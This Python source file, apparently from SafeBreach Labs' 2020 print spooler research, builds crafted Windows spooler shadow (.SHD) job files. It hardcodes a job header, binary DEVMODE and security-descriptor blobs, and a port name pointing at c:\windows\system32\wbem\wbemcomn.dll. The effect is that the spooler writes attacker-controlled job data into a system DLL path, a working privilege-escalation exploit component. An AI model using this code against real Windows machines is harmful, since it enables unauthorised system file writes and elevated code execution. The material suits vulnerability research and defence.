"""
Author: Peleg Hadar (@peleghd), SafeBreach Labs
Date: February 2020
2020 (C)
"""
import struct

class ShadowFileHeader64(object):
    def __init__(self, jobID=10, payloadSize=0, winVer=10):
        self._buf = b''
        if winVer == 10:
            self._dwSignature = struct.pack("<I", 0x5123)
        elif winVer == 7:
            self._dwSignature = struct.pack("<I", 0x4968)
        else:
            raise ValueError("Windows Version must be 10 or 7!")
        self._dwHeaderSize = struct.pack("<I", 0xE0)
        self._wStatus = struct.pack("<h", 0x800)
        self._wUnknown1 = struct.pack("<h", 0x800)
        self._dwJobID = struct.pack("I", int(jobID))
        self._dwPriority = struct.pack("<Q", 0x01)

        ## Offsets will be filled later ##
        self._offUsername = struct.pack("<Q", 0)
        self._offNotifyName = struct.pack("<Q", 0)
        self._offDocumentName = struct.pack("<Q", 0)
        self._offPort = struct.pack("<Q", 0)
        self._offPrinterName = struct.pack("<Q", 0)
        self._offDriverName = struct.pack("<Q", 0)
        self._offDevMode = struct.pack("<Q", 0)
        self._offPrintProcessor = struct.pack("<Q", 0)
        self._offDataFormat = struct.pack("<Q", 0)
        ## == END OF OFFSETS == ##

        self._dwUnknown2 = struct.pack("<I", 0)
        self._dwUnknown9 = struct.pack("<I", 0)
        self._wYear = struct.pack("<h", 0x7E4) # 2020

        # SYSTEMTIME #
        self._wMonth = struct.pack("<h", 1)
        self._wDayOfWeek = struct.pack("<h", 1)
        self._wDay = struct.pack("<h", 1)
        self._wHour = struct.pack("<h", 0xB)
        self._wMinute = struct.pack("<h", 0x20)
        self._wSecond = struct.pack("<h", 0x1D)
        self._wMilliseconds = struct.pack("<h", 0xCC)
        # END OF SYSTEMTIME #

        self._dwStartTime = struct.pack("<I", 0)
        self._dwUntilTime = struct.pack("<I", 0)
        self._dwSPLSize = struct.pack("<I", payloadSize) # TO BE FILLED LATER
        self._dwPageCount = struct.pack("<I", 1)
        self._qwSizeSecurityInfo = struct.pack("<Q", 0xFC)
        self._offSecurityInfo = struct.pack("<Q", 0) # TO BE FILLED LATER
        self._dwUnknown3 = struct.pack("<I", 0)
        self._dwUnknown4 = struct.pack("<I", 4)
        self._dwUnknown5 = struct.pack("<Q", 0)
        self._offComputerName = struct.pack("<Q", 0) # TO BE FILLED LATER
        self._qwUnknown7 = struct.pack("<Q", payloadSize) # SPLSize Again
        self._offSID = struct.pack("<Q", 0)

    def build_header(self):
        self._buf = b''

        self._buf += self._dwSignature
        self._buf += self._dwHeaderSize
        self._buf += self._wStatus
        self._buf += self._wUnknown1
        self._buf += self._dwJobID
        self._buf += self._dwPriority
        self._buf += self._offUsername
        self._buf += self._offNotifyName
        self._buf += self._offDocumentName
        self._buf += self._offPort
        self._buf += self._offPrinterName
        self._buf += self._offDriverName
        self._buf += self._offDevMode
        self._buf += self._offPrintProcessor
        self._buf += self._offDataFormat
        self._buf += self._dwUnknown2
        self._buf += self._dwUnknown9
        self._buf += self._wYear
        self._buf += self._wMonth
        self._buf += self._wDayOfWeek
        self._buf += self._wDay
        self._buf += self._wHour
        self._buf += self._wMinute
        self._buf += self._wSecond
        self._buf += self._wMilliseconds
        self._buf += self._dwStartTime
        self._buf += self._dwUntilTime
        self._buf += self._dwSPLSize
        self._buf += self._dwPageCount
        self._buf += self._qwSizeSecurityInfo
        self._buf += self._offSecurityInfo
        self._buf += self._dwUnknown3
        self._buf += self._dwUnknown4
        self._buf += self._dwUnknown5
        self._buf += self._offComputerName
        self._buf += self._qwUnknown7
        self._buf += self._offSID

    def send(self):
        return self._buf


class ShadowFilePayload64(object):
    def __init__(self, winVer=10, jobID=10, payloadSize=0, printerName=None, driverName=None, portName=None):
        self._header = ShadowFileHeader64(jobID, payloadSize, winVer)
        self._header.build_header()
        self._dataBlob = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2A\x01\x00\x00\x00\x00\x00\x00\xE0\x00\x00\x00\x00\x00\x00\x00\x89\x50\x53\x46\x0D\x0A\x1A\x0A\x00\x00\x00\x22\x49\x48\x44\x52\x50\x72\x69\x6E\x74\x65\x72\x20\x53\x65\x72\x69\x61\x6C\x69\x7A\x61\x74\x69\x6F\x6E\x20\x46\x6F\x72\x6D\x61\x74\x20\x76\x31\x2E\x30\x00\xA9\xEA\x06\x16\x00\x00\x00\xE8\x6A\x64\x73\x31\x01\x01\xCC\xCC\x04\x5D\x88\x8A\xEB\x1C\xC9\x11\x9F\xE8\x08\x00\x2B\x10\x48\x60\x02\x00\x00\x00\x2F\xEB\x91\x94\xEF\xEE\x0E\x4B\x86\x36\xD0\x76\x9A\x9A\x9C\x9E\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\xB0\x00\x00\x00\x01\x00\x00\x00\x00\x00\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00\x04\x00\x02\x00\x00\x00\x00\x00\x01\x00\x01\x00\x08\x00\x02\x00\x15\x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x00\x4D\x00\x73\x00\x50\x00\x72\x00\x69\x00\x6E\x00\x74\x00\x4A\x00\x6F\x00\x62\x00\x4F\x00\x75\x00\x74\x00\x70\x00\x75\x00\x74\x00\x46\x00\x69\x00\x6C\x00\x65\x00\x00\x00\x00\x00\x26\x00\x00\x00\x00\x00\x00\x00\x26\x00\x00\x00\x63\x00\x3A\x00\x5C\x00\x77\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00\x73\x00\x5C\x00\x73\x00\x79\x00\x73\x00\x74\x00\x65\x00\x6D\x00\x33\x00\x32\x00\x5C\x00\x77\x00\x62\x00\x65\x00\x6D\x00\x5C\x00\x77\x00\x62\x00\x65\x00\x6D\x00\x63\x00\x6F\x00\x6D\x00\x6E\x00\x2E\x00\x64\x00\x6C\x00\x6C\x00\x00\x00\x4D\x01\x51\x2E\x00\x00\x00\x00\x00\x00'
        self._userName = u"TEST\x00".encode('utf-16-le')
        self._notifyName = u"TEST\x00".encode('utf-16-le')
        self._documentName = u"Untitled\x00".encode('utf-16-le')
        self._portName = portName or u"c:\\windows\\system32\\wbem\\wbemcomn.dll\x00".encode('utf-16-le')
        self._printerName = printerName or u"MS Publisher Color Printer\x00".encode('utf-16-le')
        self._driverName = driverName or u"MS Publisher Color Printer\x00".encode('utf-16-le')
        self._devMode = b"\x4D\x00\x53\x00\x20\x00\x50\x00\x75\x00\x62\x00\x6C\x00\x69\x00\x73\x00\x68\x00\x65\x00\x72\x00\x20\x00\x43\x00\x6F\x00\x6C\x00\x6F\x00\x72\x00\x20\x00\x50\x00\x72\x00\x69\x00\x6E\x00\x74\x00\x65\x00\x72\x00\x00\x00\x50\x00\x72\x00\x69\x00\x6E\x00\x00\x00\x01\x04\x03\x06\xDC\x00\x74\x03\x53\xEF\x81\x01\x01\x00\x01\x00\xEA\x0A\x6F\x08\x64\x00\x01\x00\x0F\x00\x58\x02\x02\x00\x01\x00\x58\x02\x03\x00\x01\x00\x4C\x00\x65\x00\x74\x00\x74\x00\x65\x00\x72\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x50\x52\x49\x56\xA2\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x10\x27\x10\x27\x10\x27\x00\x00\x10\x27\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x74\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x5C\x4B\x03\x00\x68\x43\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xC0\x29\xE7\x0D\x03\x00\x00\x00\x00\x00\x00\x00\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x53\x4D\x54\x4A\x00\x00\x00\x00\x10\x00\x70\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        #if printerName:
        #    printerNameStr = printerName.decode('utf-16-le')[:-1]
        #    self._devMode = self._devMode.decode('utf-16-le').replace('MS Publisher Color Printer', printerNameStr).encode('utf-16-le')
        self._printProcessor = u"winprint\x00".encode('utf-16-le')
        self._dataFormat = u"RAW\x00".encode('utf-16-le')
        self._securityInfo = b"\x01\x00\x04\x8C\xE4\x00\x00\x00\xF0\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\xD0\x00\x07\x00\x00\x00\x00\x00\x14\x00\x20\x00\x02\x00\x01\x01\x00\x00\x00\x00\x00\x05\x12\x00\x00\x00\x00\x00\x14\x00\x30\x00\x0F\x00\x01\x01\x00\x00\x00\x00\x00\x05\x12\x00\x00\x00\x00\x10\x24\x00\x30\x00\x0F\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00\x11\xF5\x3A\x20\x08\x5E\xD3\x90\xE0\x4B\x90\x73\xF6\x03\x00\x00\x00\x10\x14\x00\x30\x00\x0F\x00\x01\x01\x00\x00\x00\x00\x00\x05\x12\x00\x00\x00\x00\x10\x18\x00\x30\x00\x0F\x00\x01\x02\x00\x00\x00\x00\x00\x0F\x02\x00\x00\x00\x01\x00\x00\x00\x00\x10\x18\x00\x30\x00\x0F\x00\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00\x20\x02\x00\x00\x00\x10\x38\x00\x30\x00\x0F\x00\x01\x0A\x00\x00\x00\x00\x00\x0F\x03\x00\x00\x00\x00\x04\x00\x00\x43\x49\x17\xF1\x79\x37\x75\x9E\x2C\x15\x71\xBA\x3F\x86\xA0\x13\x1D\xA9\x6C\xE6\xCB\xFE\x8D\x73\x8A\x55\x7B\x1B\x66\x4F\xCA\x40\x01\x01\x00\x00\x00\x00\x00\x05\x12\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x12\x00\x00\x00"
        self._computerName = u"DESKTOP\x00".encode('utf-16-le')
        self._SID = u"S-1-16-16384\x00".encode('utf-16-le')
        self._final_shd_payload = "".encode('utf-16-le')

    def build_file(self):
        curOffset = 0

        self._final_shd_payload += self._header._buf
        self._final_shd_payload += self._dataBlob
         # Add Offset
        curOffset = len(self._final_shd_payload)
        self._header._offDevMode = struct.pack("<Q", curOffset)
        self._final_shd_payload += self._devMode

         # Add Offset
        curOffset += len(self._devMode)
        self._header._offSecurityInfo = struct.pack("<Q", curOffset)
        self._final_shd_payload += self._securityInfo

        # Add Offset
        curOffset = len(self._final_shd_payload)
        self._header._offNotifyName = struct.pack("<Q", curOffset)
        self._final_shd_payload += self._notifyName
         # Add Offset
        curOffset += len(self._notifyName)
        self._header._offUsername = struct.pack("<Q", curOffset)
        self._final_shd_payload += self._userName
         # Add Offset
        curOffset += len(self._userName)
        self._header._offDocumentName = struct.pack("<Q", curOffset)
        self._final_shd_payload += self._documentName
         # Add Offset
        curOffset += len(self._documentName)
        self._header._offPort = struct.pack("<Q", curOffset)
        self._final_shd_payload += self._portName
         # Add Offset
        curOffset += len(self._portName)
        self._header._offPrinterName = struct.pack("<Q", curOffset)
        self._final_shd_payload += self._printerName
         # Add Offset
        curOffset += len(self._printerName)
        self._header._offDriverName = struct.pack("<Q", curOffset)
        self._final_shd_payload += self._driverName
         # Add Offset
        curOffset += len(self._driverName)
        self._header._offDataFormat = struct.pack("<Q", curOffset)
        self._final_shd_payload += self._dataFormat
        # Add Offset
        curOffset += len(self._dataFormat)
        self._header._offPrintProcessor = struct.pack("<Q", curOffset)
        self._final_shd_payload += self._printProcessor
         # Add Offset
        curOffset += len(self._printProcessor)
        self._header._offComputerName = struct.pack("<Q", curOffset)
        self._final_shd_payload += self._computerName
         # Add Offset
        curOffset += len(self._computerName)
        self._header._offSID = struct.pack("<Q", curOffset)
        self._final_shd_payload += self._SID

        self._final_shd_payload = self._final_shd_payload[len(self._header._buf):]
        self._header.build_header()
        self._final_shd_payload = self._header._buf + self._final_shd_payload

    def write_shd(self, path):
        with open(path, "wb") as f:
            f.write(self._final_shd_payload)
